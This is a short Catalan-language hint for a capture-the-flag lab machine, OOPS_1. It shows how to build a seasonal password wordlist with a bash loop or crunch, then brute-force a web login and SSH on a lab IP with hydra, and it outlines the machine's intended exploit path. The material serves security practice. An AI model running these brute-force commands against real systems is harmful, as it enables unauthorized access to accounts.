# OOPS_1 — pista: generar el diccionari (crunch) i atacar (hydra)

El patró de contrasenyes és `<Estació><Any>!`.

## Opció ràpida (sense crunch)
```bash
for s in Spring Summer Autumn Winter; do
  for y in $(seq 2020 2026); do
    echo "${s}${y}!"
  done
done > pat.txt
```

## Amb crunch (màscara per posicions fixes)
`crunch` és millor per longituds/charsets fixos que no per llistes de paraules,
però pots combinar-lo amb permutacions. Per aquest patró concret la llista de
dalt és més neta. Exemple purament il·lustratiu de màscara:
```bash
# 4 dígits + '!' darrere d'un prefix fix (no cobreix les estacions variables)
crunch 5 5 -t %%%%! -o year.txt
```

## Atac amb hydra contra el login web (SQLi també funciona; això és per practicar hydra)
```bash
# users.txt: admin, jsmith, mgarcia, rlopez, svc_web
hydra -L users.txt -P pat.txt 10.10.10.11 \
  http-post-form "/login.php:username=^USER^&password=^PASS^:Credencials incorrectes"
```

## O reutilització contra SSH (si algú reutilitza la contrasenya)
```bash
hydra -L users.txt -P pat.txt ssh://10.10.10.11 -t 4
```
> Nota: a OOPS_1 el compte SSH 'webadmin' té contrasenya FORTA a propòsit.
> El camí previst és web (SQLi/CmdInj/backdoor) -> enigma ASCII -> `su oopsuser`.
